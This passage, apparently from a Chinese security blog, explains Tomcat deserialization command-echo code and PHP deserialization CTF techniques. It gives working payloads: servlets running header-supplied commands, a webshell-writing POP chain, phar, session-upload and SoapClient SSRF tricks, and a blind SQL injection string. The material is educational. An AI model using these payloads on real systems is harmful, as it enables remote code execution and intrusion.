java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(&quot;req&quot;); requestField.setAccessible(true); org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo); org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1); //执行命令 String cmd = &quot;whoami&quot;; String[] cmds = !System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;) ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, cmd&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;; java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); java.util.Scanner s = new java.util.Scanner(in).useDelimiter(&quot;\\\\a&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; //回显 java.io.Writer writer = request.getResponse().getWriter(); java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(&quot;usingWriter&quot;); usingWriter.setAccessible(true); usingWriter.set(request.getResponse(), Boolean.FALSE); writer.write(output); writer.flush(); break; &#125; break; &#125; break; &#125; &#125; &#125; catch (Exception e) &#123; &#125; &#125;&#125; 这个方法的具体调用链是WebappClassLoaderBase —&gt; ApplicationContext(getResources().getContext()) —&gt; StandardService—&gt;Connector—&gt;AbstractProtocol$ConnectoinHandler—&gt;RequestGroupInfo global—&gt;RequestInfo——-&gt;Request——–&gt;Response。这个方法的问题是tomcat8以下使用不了。下一个思路来自于c0ny1(https://paper.seebug.org/1181/)自动化寻找，遍历所有的类。直接在中间件中挖掘request对象，然后反射获取。不过获取到的利用链都大同小异，都是获取当前所有线程然后从endpoint中获取protocolhandler先写个简单的servlet，为了找tomcat中的链所以不用spring之类的框架，不然找到的都是框架中的。这里就写个跟他文章里一样的。 12345678910111213141516public class HelloServlet extends HttpServlet &#123; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; try &#123; InputStream is = req.getInputStream(); ObjectInputStream oos = new ObjectInputStream(is);//这里打断点 oos.readObject(); &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; System.out.println(&quot;Hello&quot;); &#125;&#125; 然后断点下在反序列化那里，模拟真实的利用过程。在evaluate中运行这些代码。注意把他写的类和tomcat的类都导入项目中，不然爆各种各样的错误。 1234567891011121314151617List&lt;Keyword&gt; keys = new ArrayList&lt;&gt;(); keys.add(new Keyword.Builder().setField_type(&quot;Request&quot;).build()); keys.add(new Keyword.Builder().setField_type(&quot;Response&quot;).build()); //定义黑名单 List&lt;Blacklist&gt; blacklists = new ArrayList&lt;&gt;(); blacklists.add(new Blacklist.Builder().setField_type(&quot;java.io.File&quot;).build()); //新建一个广度优先搜索Thread.currentThread()的搜索器 SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys); // 设置黑名单 searcher.setBlacklists(blacklists); //打开调试模式,会生成log日志 searcher.setIs_debug(true); //挖掘深度为20 searcher.setMax_search_depth(20); //设置报告保存位置 searcher.setReport_save_path(&quot;C:\\\\Users\\\\bz\\\\Desktop\\\\ctf-old\\\\java反序列化\\\\request-searcher&quot;); searcher.searchObject(); 不同的tomcat版本跑出来的结果还不一样，虽然大同小异但还是有差别。因为不同版本用的io协议可能不同(Nio/Bio/Apr)，并且handler的类型也不同。 123456789101112TargetObject = &#123;org.apache.tomcat.util.threads.TaskThread&#125; ---&gt; group = &#123;java.lang.ThreadGroup&#125; ---&gt; threads = &#123;class [Ljava.lang.Thread;&#125; ---&gt; [13] = &#123;java.lang.Thread&#125; ---&gt; target = &#123;org.apache.tomcat.util.net.AprEndpoint$Poller&#125; ---&gt; this$0 = &#123;org.apache.tomcat.util.net.AprEndpoint&#125; ---&gt; handler = &#123;org.apache.coyote.http11.Http11AprProtocol$Http11ConnectionHandler&#125; ---&gt; global = &#123;org.apache.coyote.RequestGroupInfo&#125; ---&gt; processors = &#123;java.util.ArrayList&lt;org.apache.coyote.RequestInfo&gt;&#125; ---&gt; [0] = &#123;org.apache.coyote.RequestInfo&#125; ---&gt; req = &#123;org.apache.coyote.Request&#125; 感觉整理一个通用的也比较困难，写了个tomcat8和9下的链。tomcat7还是不一样的地方太多了，原文作者的链是7的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485public class resp8Servlet extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; try &#123; Object obj = Thread.currentThread(); Field field = obj.getClass().getSuperclass().getDeclaredField(&quot;group&quot;); field.setAccessible(true); obj = field.get(obj); field = obj.getClass().getDeclaredField(&quot;threads&quot;); field.setAccessible(true); obj = field.get(obj); Thread[] threads = (Thread[]) obj; int flag = 0; for (Thread thread : threads) &#123; if(flag == 1) &#123; break; &#125; Field[] fields = thread.getClass().getDeclaredFields(); for(int i = 0 , len = fields.length; i &lt; len; i++) &#123; // 对于每个属性，获取属性名 String varName = fields[i].getName(); if(varName.contains(&quot;target&quot;))&#123; try &#123; field = thread.getClass().getDeclaredField(&quot;target&quot;); field.setAccessible(true); obj = field.get(thread); if(obj.getClass().getName().contains(&quot;NioEndpoint$Poller&quot;)) &#123; field = obj.getClass().getDeclaredField(&quot;this$0&quot;); field.setAccessible(true); org.apache.tomcat.util.net.NioEndpoint Nioobj = (org.apache.tomcat.util.net.NioEndpoint) field.get(obj); obj = Nioobj.getHandler(); field = obj.getClass().getDeclaredField(&quot;global&quot;); field.setAccessible(true); obj = field.get(obj); field = obj.getClass().getDeclaredField(&quot;processors&quot;); field.setAccessible(true); obj = field.get(obj); ArrayList processors = (ArrayList) obj; for (Object o : processors) &#123; try &#123; field = o.getClass().getDeclaredField(&quot;req&quot;); field.setAccessible(true); obj = field.get(o); org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) obj; org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1); String cmd = &quot;whoami&quot;; String[] cmds = !System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;) ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, cmd&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;; java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); java.util.Scanner s = new java.util.Scanner(in).useDelimiter(&quot;\\\\a&quot;); String out = s.hasNext() ? s.next() : &quot;&quot;; java.io.Writer writer = request.getResponse().getWriter(); java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(&quot;usingWriter&quot;); usingWriter.setAccessible(true); usingWriter.set(request.getResponse(), Boolean.FALSE); writer.write(out); writer.flush(); flag = 1; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 其实和Litch1的后半段是一样的，区别在于获取ConnectionHandler的过程。这个工具的思路是从Thread.currentThread()出发的。在后半段一样的基础上还有第三种方法，来自李三(https://xz.aliyun.com/t/7535)利用注册组件直接获取processor。这个方法也是最通用的，本地单机测试tomcat789都可以。具体获取方法和代码是从参考文章里抄的，改了下打印的部分变成通用的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class mbeanServlet extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; try &#123; MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer(); Field field = Class.forName(&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;).getDeclaredField(&quot;mbsInterceptor&quot;); field.setAccessible(true); Object mbsInterceptor = field.get(mBeanServer); field = Class.forName(&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;).getDeclaredField(&quot;repository&quot;); field.setAccessible(true); Repository repository = (Repository) field.get(mbsInterceptor); Set&lt;NamedObject&gt; set = repository.query(new ObjectName(&quot;*:type=GlobalRequestProcessor,name=\\&quot;http*\\&quot;&quot;), null); Iterator&lt;NamedObject&gt; it = set.iterator(); while (it.hasNext()) &#123; NamedObject namedObject = it.next(); field = Class.forName(&quot;com.sun.jmx.mbeanserver.NamedObject&quot;).getDeclaredField(&quot;name&quot;); field.setAccessible(true); field = Class.forName(&quot;com.sun.jmx.mbeanserver.NamedObject&quot;).getDeclaredField(&quot;object&quot;); field.setAccessible(true); Object obj = field.get(namedObject); field = Class.forName(&quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;).getDeclaredField(&quot;resource&quot;); field.setAccessible(true); Object resource = field.get(obj); field = Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;).getDeclaredField(&quot;processors&quot;); field.setAccessible(true); ArrayList processors = (ArrayList) field.get(resource); field = Class.forName(&quot;org.apache.coyote.RequestInfo&quot;).getDeclaredField(&quot;req&quot;); field.setAccessible(true); for (int i=0; i &lt; processors.size(); i++) &#123; org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) field.get(processors.get(i)); org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1); String cmd = request.getHeader(&quot;tomcat&quot;); String[] cmds = !System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;) ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, cmd&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;; java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); java.util.Scanner s = new java.util.Scanner(in).useDelimiter(&quot;\\\\a&quot;); String out = s.hasNext() ? s.next() : &quot;&quot;; java.io.Writer writer = request.getResponse().getWriter(); java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(&quot;usingWriter&quot;); usingWriter.setAccessible(true); usingWriter.set(request.getResponse(), Boolean.FALSE); writer.write(out); writer.flush(); &#125; &#125; &#125;catch (Throwable throwable) &#123; throwable.printStackTrace(); &#125; &#125;&#125; 总的来说最后一种方法是最好的，原理简单，通用性强。 参考链接https://xz.aliyun.com/t/7348https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651374294&amp;idx=3&amp;sn=82d050ca7268bdb7bcf7ff7ff293d7b3https://xz.aliyun.com/t/7535https://paper.seebug.org/1181/https://lucifaer.com/2020/05/12/Tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0","categories":[],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://yoursite.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"php反序列化的千层套路","slug":"php反序列化的千层套路","date":"2020-04-02T13:32:50.000Z","updated":"2020-05-22T07:23:56.000Z","comments":true,"path":"2020/04/02/php反序列化的千层套路/","link":"","permalink":"http://yoursite.com/2020/04/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8D%83%E5%B1%82%E5%A5%97%E8%B7%AF/","excerpt":"作为最好的语言的旗舰款漏洞，php反序列化在国内CTF基本有百分百的出场率。不过我基本没做过几道，总结一下顺便做几个题。","text":"作为最好的语言的旗舰款漏洞，php反序列化在国内CTF基本有百分百的出场率。不过我基本没做过几道，总结一下顺便做几个题。反序列化的本质就是注入一个对象然后调用它的某些方法，反序列化过程是只能传递变量不能传递方法的，所以需要程序本身定义了这个对象的这些方法。最基础的就是利用魔术方法，比较复古的利用方法。 123456789101112__construct() 当一个对象创建时被调用__destruct() 当一个对象销毁时被调用__toString() 当一个对象被当作一个字符串使用时被调用__sleep() 在对象被序列化之前运行__wakeup() 在对象被反序列化之前被调用__call() 在对象上下文中调用不可访问的方法时触发__callStatic() 在静态上下文中调用不可访问的方法时触发__get() 用于从不可访问的属性读取数据__set() 用于将数据写入不可访问的属性__isset() 在不可访问的属性上调用isset()或empty()触发__unset() 在不可访问的属性上使用unset()时触发__invoke() 当脚本尝试将对象调用为函数时触发 一个常见套路是绕过wakeup方法(CVE-2016-7124)，当低版本(PHP5&lt;5.6.25、PHP7&lt;7.0.10)序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行。比如把 123O:9:&quot;Twosmil1e&quot;:1:&#123;s:3:&quot;key&quot;;s:8:&quot;twosmi1e&quot;;&#125; 改为O:9:&quot;Twosmil1e&quot;:2:&#123;s:3:&quot;key&quot;;s:8:&quot;twosmi1e&quot;;&#125; 一般是利用不同类同名方法来调用，寻找pop链，主要是细心。看一道例题，eis2019的ezpop 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122&lt;?phperror_reporting(0);class A &#123; protected $store; protected $key; protected $expire; public function __construct($store, $key = &#x27;flysystem&#x27;, $expire = null) &#123; $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; &#125; public function cleanContents(array $contents) &#123; $cachedProperties = array_flip([ &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;, &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;, ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125; return $contents; &#125; public function getForStorage() &#123; $cleaned = $this-&gt;cleanContents($this-&gt;cache); return json_encode([$cleaned, $this-&gt;complete]); &#125; public function save() &#123; $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); &#125; public function __destruct() &#123; if (!$this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125;&#125;class B &#123; protected function getExpireTime($expire): int &#123; return (int) $expire; &#125; public function getCacheKey(string $name): string &#123; return $this-&gt;options[&#x27;prefix&#x27;] . $name; &#125; protected function serialize($data): string &#123; if (is_numeric($data)) &#123; return (string) $data; &#125; $serialize = $this-&gt;options[&#x27;serialize&#x27;]; return $serialize($data); &#125; public function set($name, $value, $expire = null): bool&#123; $this-&gt;writeTimes++; if (is_null($expire)) &#123; $expire = $this-&gt;options[&#x27;expire&#x27;]; &#125; $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) &#123; try &#123; mkdir($dir, 0755, true); &#125; catch (\\Exception $e) &#123; // 创建失败 &#125; &#125; $data = $this-&gt;serialize($value); if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123; //数据压缩 $data = gzcompress($data, 3); &#125; $data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; $result = file_put_contents($filename, $data); if ($result) &#123; return true; &#125; return false; &#125;&#125;if (isset($_GET[&#x27;src&#x27;]))&#123; highlight_file(__FILE__);&#125;$dir = &quot;uploads/&quot;;if (!is_dir($dir))&#123; mkdir($dir);&#125;unserialize($_GET[&quot;data&quot;]); 首先找一个切入点，给出了两个类，而这两个类具有同名函数set，并且set中有写文件操作，很明显就是利用这个函数。set是在A类析构的时候由A类的save函数调用。接下来看set的参数，第一个和第三个是可以直接设置的。第二个参数来自getForStorage函数。getForStorage函数又调用了cleanContents。A类的过程就整理清楚了。然后b类就按照函数需要缺啥补啥，为了省事serialize选择一个不做改变的函数(strval)。最后看到有个死亡exit，利用伪协议作为前缀base64编码绕过，如果不能正确解码就添加1-4个字符满足base64的条件即可。最后payload 123456$b = new B();$b -&gt; options = array(&quot;serialize&quot;=&gt;&quot;strval&quot;,&quot;prefix&quot;=&gt;&quot;php://filter/write=convert.base64-decode/resource=./uploads/&quot;,&quot;expire&quot;=&gt;&quot;321&quot;); $a = new A($b,&quot;a.php&quot;);$a -&gt; cache = array(&quot;a&quot;=&gt;&quot;reasdfPD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&quot;);echo urlencode(serialize($a)); 总之就是注意最后的利用点(文件写入/读取、命令执行)以及同名函数。另一类是session反序列化，利用session不同的存储格式，php格式和php_serialize格式混合起来用导致漏洞。具体方法就是在php_serialize格式存储的文件传入单竖线(|)+恶意对象的序列化字符串，然后访问使用php格式处理session的文件，session_start函数会进行反序列化引入恶意对象。当然利用这种方法肯定需要控制session值，除了直接$_SESSION[‘session’] = $_GET[‘session’]这种方法，还可以利用session的upload_process参数，没有显式的赋值但会存储传入的值作为session的键值。例题是javisoj的phpinfo，很经典 1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = &#x27;phpinfo();&#x27;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET[&#x27;phpinfo&#x27;]))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents(&#x27;index.php&#x27;));&#125;?&gt; 看上去没有传参的地方，但php页面是可以上传数据的，参考https://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress弄一个上传页面，name要和phpinfo中的session.upload_progress.name相同 12345&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 抓包修改上传的filename或者UPLOAD_PROGRESS的内容为|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:34:&quot;var_dump(glob(dirname(FILE)));&quot;;}这种格式就可以执行代码。这题直接glob(‘*’)的话是在根目录，所以要利用dirname(FILE)找一下web目录的位置。接下来就是最网红的phar反序列化，可能是最近两年最火的php漏洞。特点就是不依赖unserialize，通过上传phar文件通过某些函数触发反序列化。这种隐式方式和session反序列化有些类似。利用方法就是生成一个phar文件并通过某些方法触发反序列化： 12345678910111213141516171819202122&lt;?php class TestObject &#123; &#125; $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&#x27;GIF89a&#x27;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，可以添加文件头绕过检测 $o = new TestObject(); $o -&gt; data=&#x27;xxxxxx&#x27;; $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt;&lt;?phpclass TestObject&#123; function __destruct() &#123; echo $this -&gt; data; // TODO: Implement __destruct() method. &#125;&#125;include(&#x27;phar://phar.phar&#x27;);?&gt; 大概列举下可以触发phar反序列化的函数 123456789101112131415161718192021fileatime / filectime / filemtimestat / fileinode / fileowner / filegroup / filepermsfile / file_get_contents / readfile / fopen`file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writableparse_ini_fileunlinkcopyexif_thumbnailexif_imagetypemime_content_typeimageloadfontimagecreatefrom***hash_hmac_filehash_filehash_update_filemd5_filesha1_fileget_meta_tagsget_headersgetimagesizegetimagesizefromstring 反正传个文件进去的都有可能绕过过滤的方法： 1234$z = &#x27;compress.bzip2://phar:///home/sx/test.phar/test.txt&#x27;;$z = &#x27;compress.zlib://phar:///home/sx/test.phar/test.txt&#x27;;php://filter/read=convert.base64-encode/resource=phar://phar.pharphp://filter/resource=phar://phar.phar 例题就是之前写过的bytecms的ezcms，利用Zip内置类的同名open方法。说到内置类，还有一个很经典的就是Soap类的call魔法方法实现ssrf， 123456&lt;?php$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;bbb&#x27;, &#x27;location&#x27;=&gt;&#x27;http://127.0.0.1:5555/path&#x27;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function(); 运行后本地5555端口收到请求 12345678910POST /path HTTP/1.1Host: 127.0.0.1:5555Connection: Keep-AliveUser-Agent: PHP-SOAP/5.5.12Content-Type: text/xml; charset=utf-8SOAPAction: &quot;bbb#not_exists_function&quot;Content-Length: 382&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;bbb&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:not_exists_function/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; 从数据包看到SOAPAction是可控的，存在CRLF注入，但是这里不能修改content-type，所以并不能利用。利用方式是修改user-agent，来自wupco 1234567891011121314151617&lt;?php$target = &#x27;http://127.0.0.1:5555/path&#x27;;$post_string = &#x27;data=something&#x27;;$headers = array( &#x27;X-Forwarded-For: 127.0.0.1&#x27;, &#x27;Cookie: PHPSESSID=my_session&#x27; );$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;.(string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27; =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#x27;^^&#x27;,&quot;\\r\\n&quot;,$aaa);$aaa = str_replace(&#x27;&amp;&#x27;,&#x27;&amp;&#x27;,$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt; 这样就有了一个post的ssrf例题是N1CTF2018的easy_harder_php第一步是注入，有几处sql都是直接拼接字符串的，虽然有个全局的addslashes转义了单引号，但是在insert中把重音符号转化成了单引号 12345678910111213141516171819private function get_column($columns)&#123; if(is_array($columns)) $column = &#x27; `&#x27;.implode(&#x27;`,`&#x27;,$columns).&#x27;` &#x27;; else $column = &#x27; `&#x27;.$columns.&#x27;` &#x27;; return $column; &#125;public function insert($columns,$table,$values)&#123; $column = $this-&gt;get_column($columns); $value = &#x27;(&#x27;.preg_replace(&#x27;/`([^`,]+)`/&#x27;,&#x27;\\&#x27;$&#123;1&#125;\\&#x27;&#x27;,$this-&gt;get_column($values)).&#x27;)&#x27;; $nid = $sql = &#x27;insert into &#x27;.$table.&#x27;(&#x27;.$column.&#x27;) values &#x27;.$value; $result = $this-&gt;conn-&gt;query($sql); return $result; &#125; 所以可以拼接绕过，一共是三列，可控点在第二列，所以使用aaa`,if(ascii(substr((select password from ctf_users where username=0x61646d696e),%d,1))=%d,sleep(3),0))#这种就可以时间盲注，得到密码nu1ladmin然后才是反序列化部分，showmess类存在反序列化 12345678910111213141516171819202122232425262728293031323334function showmess() &#123; if(!$this-&gt;check_login()) return false; if($this-&gt;is_admin == 0) &#123; //id,sig,mood,ip,country,subtime $db = new Db(); @$ret = $db-&gt;select(array(&#x27;username&#x27;,&#x27;signature&#x27;,&#x27;mood&#x27;,&#x27;id&#x27;),&#x27;ctf_user_signature&#x27;,&quot;userid = $this-&gt;userid order by id desc&quot;); if($ret) &#123; $data = array(); while ($row = $ret-&gt;fetch_row()) &#123; $sig = $row[1]; $mood = unserialize($row[2]); $country = $mood-&gt;getcountry(); $ip = $mood-&gt;ip; $subtime = $mood-&gt;getsubtime(); $allmess = array(&#x27;id&#x27;=&gt;$row[3],&#x27;sig&#x27; =&gt; $sig, &#x27;mood&#x27; =&gt; $mood, &#x27;ip&#x27; =&gt; $ip, &#x27;country&#x27; =&gt; $country, &#x27;subtime&#x27; =&gt; $subtime); array_push($data, $allmess); &#125; $data = json_encode(array(&#x27;code&#x27;=&gt;0,&#x27;data&#x27;=&gt;$data)); return $data; &#125; else return false; &#125; else &#123; $filenames = scandir(&#x27;adminpic/&#x27;); array_splice($filenames, 0, 2); return json_encode(array(&#x27;code&#x27;=&gt;1,&#x27;data&#x27;=&gt;$filenames)); &#125; &#125; 所以注入一个Soap类调用其不存在的getcountry函数时就会触发call方法实现ssrf。就用上边的脚本最后bin2hex一下就行了。 还有种题型是反序列化逃逸，一般是通过preg_replace之类添加或去除了一些内容，导致反序列化结果发生变化。 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 问题出在filter(serialize($_SESSION))这里，修改了序列化后的值导致逃逸。$_SESSION可以利用变量覆盖控制，控制了img就可以读任意文件了。 1234567891011121314151617&lt;?php$_SESSION[&quot;user&quot;]=&#x27;flagflagflagflagflagflag&#x27;;$_SESSION[&quot;function&quot;]=&#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&#x27;;$_SESSION[&quot;img&quot;]=&#x27;L2QwZzNfZmxsbGxsbGFn&#x27;;var_dump(serialize($_SESSION));//a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;去掉flag之后变成a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;unsrialize(上边这行)array(3) &#123; &#x27;user&#x27; =&gt; string(24) &quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot; &#x27;img&#x27; =&gt; string(20) &quot;ZDBnM19mMWFnLnBocA==&quot; &#x27;dd&#x27; =&gt; string(1) &quot;a&quot;&#125; 这样就把s:59给划到前面的字符串里了，img属性就逃了出来，原本的img属性被挤到大括号后面不会执行。至于为什么加dd那个属性，因为原来数组有三项，改过还得是三个，不然会报错。后记写完了感觉好水，不水又没有东西写，只能水水维持生活。越来越感觉CTF是个无底洞，需要的广度大于深度，还是把精力放在挖洞吧，成果比较快。 参考链接https://skysec.top/2019/07/18/Summary-of-serialization-attacks-Part-3/https://blog.zsxsoft.com/post/38https://xz.aliyun.com/t/6699","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"java反序列化连续剧三","slug":"java反序列化连续剧三","date":"2020-03-28T07:59:17.000Z","updated":"2020-03-31T14:08:28.000Z","comments":true,"path":"2020/03/28/java反序列化连续剧三/","link":"","permalink":"http://yoursite.com/2020/03/28/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9E%E7%BB%AD%E5%89%A7%E4%B8%89/","excerpt":"写完了jndi注入，直接来看一下非常火的fastjson反序列化漏洞，基本也是基于jndi注入的。","text":"写完了jndi注入，直接来看一下非常火的fastjson反序列化漏洞，基本也是基于jndi注入的。首先来看下正常的fastjson的用法，其实就是一个json解析器，类似js的JSON.parse。在https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.24/下载需要的jar包。先随便定义一个类Student,为了清楚观察get和set函数的调用加一些print。 12345678910111213141516171819202122232425262728public class Student &#123; public String name; public int age; public Student() &#123; System.out.println(&quot;构造函数&quot;); &#125; public String getName() &#123; System.out.println(&quot;getName&quot;); return name; &#125; public void setName(String name) &#123; System.out.println(&quot;setName&quot;); this.name = name; &#125; public int getAge() &#123; System.out.println(&quot;getAge&quot;); return age; &#125; public void setAge(int age) &#123; System.out.println(&quot;setAge&quot;); this.age = age; &#125;&#125; 然后写个测试类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import com.alibaba.fastjson.JSON;import 